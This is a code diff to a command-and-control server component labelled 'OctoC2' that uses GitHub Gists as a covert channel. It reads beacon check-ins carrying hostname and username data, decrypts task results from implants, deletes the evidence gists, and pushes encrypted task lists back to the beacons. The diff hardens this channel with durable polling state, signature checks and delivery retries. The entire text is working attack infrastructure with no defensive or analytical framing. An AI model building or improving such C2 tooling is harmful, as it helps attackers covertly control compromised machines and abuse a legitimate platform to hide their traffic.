@@ -1,236 +1,336 @@
-/**
- * OctoC2 Server — GistChannel
- *
- * Polls GitHub Gists every pollIntervalMs for beacon activity:
- *   svc-a-{id8}.json  —  Beacon → Server  ACK / registration payload
- *   svc-r-{id8}.json  —  Beacon → Server  Sealed TaskResult blob
- *
- * Delivers pending tasks to gist-registered beacons via:
- *   svc-t-{id8}.json  —  Server → Beacon  Encrypted Task[] blob
- *
- * Crypto:
- *   Incoming results (beacon → server): crypto_box_seal — openSealBox()
- *   Outgoing tasks   (server → beacon): crypto_box      — encryptForBeacon()
- */
-
+import { createRequire } from "node:module";
 import type { Octokit } from "@octokit/rest";
+import type _SodiumModule from "libsodium-wrappers";
 import type { BeaconRegistry } from "../BeaconRegistry.ts";
 import type { TaskQueue } from "../TaskQueue.ts";
 import {
-  openSealBox, encryptForBeacon,
-  base64ToBytes, bytesToBase64,
+  base64ToBytes,
+  encryptForBeacon,
+  openSealBox,
 } from "../crypto/sodium.ts";
-import { createRequire } from "node:module";
-import type _SodiumModule from "libsodium-wrappers";
+import {
+  DurablePollState,
+  PollRunner,
+  repositoryPollScope,
+} from "../lib/PollRunner.ts";
+import { collectGitHubPages } from "../lib/GitHubPagination.ts";
+import { sha256Hex } from "../store/index.ts";
+import {
+  assertAcceptedResult,
+  checkinAuthorizesTaskDelivery,
+  parseCheckinPayload,
+  parseTaskResult,
+  type SecureChannelServices,
+} from "./ChannelServices.ts";
+import {
+  claimDeliveries,
+  finishDeliveries,
+  processIncomingArtifact,
+  rejectArtifact,
+} from "./ChannelRuntime.ts";
 
-const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;
+const sodium = createRequire(import.meta.url)(
+  "libsodium-wrappers",
+) as typeof _SodiumModule;
 
 interface GistChannelOpts {
-  owner:             string;
-  repo:              string;
-  token:             string;
+  owner: string;
+  repo: string;
+  token: string;
   operatorSecretKey: Uint8Array;
-  pollIntervalMs:    number;
-  octokit:           Octokit;
-}
-
-interface AckPayload {
-  beaconId:  string;
-  publicKey: string;
-  hostname:  string;
-  username:  string;
-  os:        string;
-  arch:      string;
-  checkinAt: string;
-}
-
-interface ResultPayload {
-  taskId:      string;
-  beaconId:    string;
-  success:     boolean;
-  output:      string;
-  completedAt: string;
+  pollIntervalMs: number;
+  octokit: Octokit;
 }
 
 export class GistChannel {
-  private timer: ReturnType<typeof setInterval> | null = null;
-
-  /** beaconIds that registered via ACK gists (gist-channel beacons) */
-  private readonly gistBeacons = new Set<string>();
-
-  /** Gist IDs already processed as ACKs (avoid re-registration) */
-  private readonly seenAckGistIds = new Set<string>();
+  private readonly runner: PollRunner;
+  private readonly ackProgress: DurablePollState;
+  private readonly resultProgress: DurablePollState;
 
   constructor(
     private readonly registry: BeaconRegistry,
-    private readonly queue:    TaskQueue,
-    private readonly opts:     GistChannelOpts,
-  ) {}
+    private readonly queue: TaskQueue,
+    private readonly opts: GistChannelOpts,
+    private readonly services: SecureChannelServices,
+  ) {
+    const scope = repositoryPollScope(opts.owner, opts.repo);
+    this.ackProgress = new DurablePollState(
+      services.store,
+      "gist-ack-poll",
+      scope,
+    );
+    this.resultProgress = new DurablePollState(
+      services.store,
+      "gist-result-poll",
+      scope,
+    );
+    this.runner = new PollRunner({
+      name: "GistChannel",
+      intervalMs: opts.pollIntervalMs,
+      poll: () => this.poll(),
+      onError: (error) => {
+        console.error(
+          "[GistChannel] Poll error:",
+          error instanceof Error ? error.message : String(error),
+        );
+      },
+    });
+  }
 
   start(): void {
-    if (this.timer) return;
-    this.timer = setInterval(() => {
-      this.poll().catch(err =>
-        console.error("[GistChannel] Poll error:", (err as Error).message)
-      );
-    }, this.opts.pollIntervalMs);
+    this.runner.start();
     console.log("[GistChannel] Started polling");
   }
 
-  stop(): void {
-    if (this.timer) {
-      clearInterval(this.timer);
-      this.timer = null;
-      console.log("[GistChannel] Stopped");
-    }
+  async stop(): Promise<void> {
+    await this.runner.stop();
+    console.log("[GistChannel] Stopped");
   }
-
-  // ── Poll cycle ────────────────────────────────────────────────────────────────
 
   private async poll(): Promise<void> {
-    await this.processAckGists();
-    await this.processResultGists();
-    await this.deliverPendingTasks();
+    const listed = await collectGitHubPages(
+      (page, per_page) =>
+        this.opts.octokit.rest.gists.list({ page, per_page }),
+      (response) => response.data as any[],
+    );
+    const gists = listed.sort((left: any, right: any) =>
+      artifactTimestamp(left).localeCompare(artifactTimestamp(right))
+    );
+    const deliveryEligible = await this.processAckGists(gists);
+    await this.processResultGists(gists);
+    await this.deliverPendingTasks(deliveryEligible);
   }
 
-  // ── ACK gist processing ───────────────────────────────────────────────────────
-
-  private async processAckGists(): Promise<void> {
-    let gists: any[];
-    try {
-      const resp = await this.opts.octokit.rest.gists.list({ per_page: 100 });
-      gists = resp.data as any[];
-    } catch (err) {
-      console.warn("[GistChannel] Failed to list gists:", (err as Error).message);
-      return;
-    }
-
+  private async processAckGists(gists: any[]): Promise<Set<string>> {
+    const deliveryEligible = new Set<string>();
     for (const gist of gists) {
-      const files: Record<string, any> = gist.files ?? {};
-      const ackFile = Object.keys(files).find(f => f.startsWith("svc-a-") && f.endsWith(".json"));
-      if (!ackFile) continue;
-      if (this.seenAckGistIds.has(gist.id)) continue;
-      this.seenAckGistIds.add(gist.id);
-
-      try {
-        const fullResp = await this.opts.octokit.rest.gists.get({ gist_id: gist.id });
-        const fileEntry = (fullResp.data as any).files?.[ackFile];
-        const content = fileEntry?.content ?? "";
-        if (!content) continue;
-
-        const ack = JSON.parse(content) as AckPayload;
-        if (!ack.beaconId || !ack.publicKey) continue;
-
-        this.registry.register({
-          beaconId:    ack.beaconId,
-          issueNumber: 0,
-          publicKey:   ack.publicKey,
-          hostname:    ack.hostname,
-          username:    ack.username,
-          os:          ack.os,
-          arch:        ack.arch,
-          seq:         0,
-        });
-        this.gistBeacons.add(ack.beaconId);
-
-        console.log(`[GistChannel] Registered beacon ${ack.beaconId} from ACK gist`);
-      } catch (err) {
-        console.warn("[GistChannel] ACK processing error:", (err as Error).message);
-      }
-    }
-  }
-
-  // ── Result gist processing ────────────────────────────────────────────────────
-
-  private async processResultGists(): Promise<void> {
-    let gists: any[];
-    try {
-      const resp = await this.opts.octokit.rest.gists.list({ per_page: 100 });
-      gists = resp.data as any[];
-    } catch (err) {
-      console.warn("[GistChannel] Failed to list gists:", (err as Error).message);
-      return;
-    }
-
-    for (const gist of gists) {
-      const files: Record<string, any> = gist.files ?? {};
-      const resultFile = Object.keys(files).find(f => f.startsWith("svc-r-") && f.endsWith(".json"));
-      if (!resultFile) continue;
-
-      try {
-        const fullResp = await this.opts.octokit.rest.gists.get({ gist_id: gist.id });
-        const fileEntry = (fullResp.data as any).files?.[resultFile];
-        const sealed = (fileEntry?.content ?? "").trim();
-        if (!sealed) continue;
-
-        // Derive operator public key from secret key
-        await _sodium.ready;
-        const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);
-
-        const plainBytes = await openSealBox(sealed, operatorPublicKey, this.opts.operatorSecretKey);
-        const plain = new TextDecoder().decode(plainBytes);
-        const result = JSON.parse(plain) as ResultPayload;
-
-        if (result.taskId) {
-          this.queue.markCompleted(result.taskId, plain);
-          console.log(`[GistChannel] Task ${result.taskId} completed (success=${result.success})`);
-        }
-
-        // Delete the result gist
-        await this.opts.octokit.rest.gists.delete({ gist_id: gist.id });
-      } catch (err) {
-        console.warn("[GistChannel] Result processing error:", (err as Error).message);
-      }
-    }
-  }
-
-  // ── Task delivery ─────────────────────────────────────────────────────────────
-
-  private async deliverPendingTasks(): Promise<void> {
-    for (const beaconId of this.gistBeacons) {
-      const allPending = this.queue.getPendingTasks(beaconId);
-      const pending = allPending.filter(
-        t => !t.preferredChannel || t.preferredChannel === "gist"
+      const files = (gist.files ?? {}) as Record<string, any>;
+      const filename = Object.keys(files).find((name) =>
+        name.startsWith("svc-a-") && name.endsWith(".json")
       );
-      if (pending.length === 0) continue;
-
-      const beacon = this.registry.get(beaconId);
-      if (!beacon) continue;
+      if (!filename) continue;
 
       try {
-        const beaconPublicKey = await base64ToBytes(beacon.publicKey);
-        const taskJson = JSON.stringify(pending.map(t => ({
-          taskId: t.taskId,
-          kind:   t.kind,
-          args:   t.args,
-          ref:    t.ref,
-        })));
+        const response = await this.opts.octokit.rest.gists.get({
+          gist_id: gist.id,
+        });
+        const serialized = String(
+          (response.data as any).files?.[filename]?.content ?? "",
+        );
+        const id8 = filename.slice("svc-a-".length, -".json".length);
+        const version =
+          gist.updated_at ??
+          gist.created_at ??
+          sha256Hex(serialized);
+        const messageId =
+          `ack:${String(gist.id)}:${String(version)}:${sha256Hex(serialized)}`;
+        const processed = await processIncomingArtifact(
+          this.services,
+          this.ackProgress,
+          {
+            messageId,
+            payload: serialized,
+            cursor: artifactTimestamp(gist),
+          },
+          "malformed ACK gist",
+          () => {
+            const checkin = parseCheckinPayload(serialized);
+            if (!checkin.beaconId.startsWith(id8)) {
+              rejectArtifact(
+                "ACK gist filename does not match signed beaconId",
+              );
+            }
+            return checkin;
+          },
+          async (checkin) => {
+            const status =
+              await this.services.identities.verifyAndRegisterCheckin(
+              checkin,
+              checkin.beaconId,
+              6,
+            );
+            return {
+              outcome: checkinAuthorizesTaskDelivery(status)
+                ? "accepted"
+                : "duplicate",
+              beaconId: checkin.beaconId,
+            };
+          },
+        );
+        if (processed.status === "conflicting_duplicate") {
+          rejectArtifact("conflicting ACK gist");
+        }
+        if (
+          processed.status === "processed" &&
+          processed.outcome === "accepted" &&
+          processed.value
+        ) {
+          deliveryEligible.add(processed.value.beaconId);
+        }
+      } catch (error) {
+        console.warn(
+          "[GistChannel] ACK processing error:",
+          (error as Error).message,
+        );
+      }
+    }
+    return deliveryEligible;
+  }
 
-        const encrypted = await encryptForBeacon(
-          taskJson,
-          beaconPublicKey,
+  private async processResultGists(gists: any[]): Promise<void> {
+    for (const gist of gists) {
+      const files = (gist.files ?? {}) as Record<string, any>;
+      const filename = Object.keys(files).find((name) =>
+        name.startsWith("svc-r-") && name.endsWith(".json")
+      );
+      if (!filename) continue;
+
+      try {
+        const response = await this.opts.octokit.rest.gists.get({
+          gist_id: gist.id,
+        });
+        const sealed = String(
+          (response.data as any).files?.[filename]?.content ?? "",
+        ).trim();
+        await sodium.ready;
+        const operatorPublicKey = sodium.crypto_scalarmult_base(
           this.opts.operatorSecretKey,
         );
+        const id8 = filename.slice("svc-r-".length, -".json".length);
+        const version =
+          gist.updated_at ??
+          gist.created_at ??
+          sha256Hex(sealed);
+        const messageId = `result:${String(gist.id)}:${String(version)}`;
+        const processed = await processIncomingArtifact(
+          this.services,
+          this.resultProgress,
+          {
+            messageId,
+            payload: sealed,
+            cursor: artifactTimestamp(gist),
+          },
+          "malformed result gist",
+          async () => {
+            if (!sealed) rejectArtifact("result gist is empty");
+            const result = parseTaskResult(new TextDecoder().decode(
+              await openSealBox(
+                sealed,
+                operatorPublicKey,
+                this.opts.operatorSecretKey,
+              ),
+            ));
+            if (
+              !result.beaconId.toLowerCase().startsWith(id8.toLowerCase())
+            ) {
+              rejectArtifact(
+                "result gist filename does not match signed beaconId",
+              );
+            }
+            return result;
+          },
+          async (result) => {
+            const accepted = assertAcceptedResult(
+              await this.services.tasks.acceptSignedResult(
+                result,
+                result.beaconId,
+                {
+                  channel: "gist",
+                  messageId,
+                  payloadDigest: sha256Hex(sealed),
+                },
+              ),
+            );
+            return {
+              outcome: accepted,
+              beaconId: result.beaconId,
+              taskId: result.taskId,
+            };
+          },
+        );
+        if (processed.status === "conflicting_duplicate") {
+          rejectArtifact("conflicting result gist");
+        }
+        if (processed.outcome !== "rejected") {
+          await this.opts.octokit.rest.gists.delete({ gist_id: gist.id });
+        }
+      } catch (error) {
+        console.warn(
+          "[GistChannel] Result processing error:",
+          (error as Error).message,
+        );
+      }
+    }
+  }
 
-        const id8 = beaconId.slice(0, 8);
-        const taskFilename = `svc-t-${id8}.json`;
+  private async deliverPendingTasks(
+    deliveryEligible: ReadonlySet<string>,
+  ): Promise<void> {
+    for (const beaconId of deliveryEligible) {
+      const pending = this.queue.getDeliverableTasks(beaconId, "gist");
+      if (pending.length === 0) continue;
+      const deliveries = claimDeliveries(
+        this.services,
+        "gist",
+        beaconId,
+        pending,
+        Math.max(this.opts.pollIntervalMs * 2, 60_000),
+      );
+      if (deliveries.length === 0) continue;
+      const beacon = this.registry.get(beaconId);
+      if (!beacon) {
+        finishDeliveries(
+          this.services,
+          deliveries,
+          "permanent_failure",
+          "beacon registry entry is unavailable",
+        );
+        continue;
+      }
 
+      try {
+        const encrypted = await encryptForBeacon(
+          JSON.stringify(deliveries.map(({ task }) => ({
+            taskId: task.taskId,
+            kind: task.kind,
+            args: task.args,
+            ref: task.ref,
+          }))),
+          await base64ToBytes(beacon.publicKey),
+          this.opts.operatorSecretKey,
+        );
         await this.opts.octokit.rest.gists.create({
           public: false,
           files: {
-            [taskFilename]: { content: JSON.stringify(encrypted) },
+            [`svc-t-${beaconId.slice(0, 8)}.json`]: {
+              content: JSON.stringify(encrypted),
+            },
           },
         } as any);
-
-        // Mark tasks as delivered
-        for (const t of pending) {
-          this.queue.markDelivered(t.taskId);
-        }
-
-        console.log(`[GistChannel] Delivered ${pending.length} task(s) to beacon ${beaconId}`);
-      } catch (err) {
-        console.warn(`[GistChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
+        finishDeliveries(this.services, deliveries, "delivered");
+        this.registry.updateActiveTentacle(beaconId, 6);
+      } catch (error) {
+        finishDeliveries(
+          this.services,
+          deliveries,
+          "transient_failure",
+          error,
+        );
+        console.warn(
+          `[GistChannel] Task delivery error for ${beaconId}:`,
+          (error as Error).message,
+        );
       }
     }
   }
+}
+
+function artifactTimestamp(artifact: any): string {
+  const candidate = artifact.updated_at ?? artifact.created_at;
+  const timestamp = typeof candidate === "string"
+    ? new Date(candidate).getTime()
+    : Number.NaN;
+  return Number.isFinite(timestamp)
+    ? new Date(timestamp).toISOString()
+    : new Date().toISOString();
 }
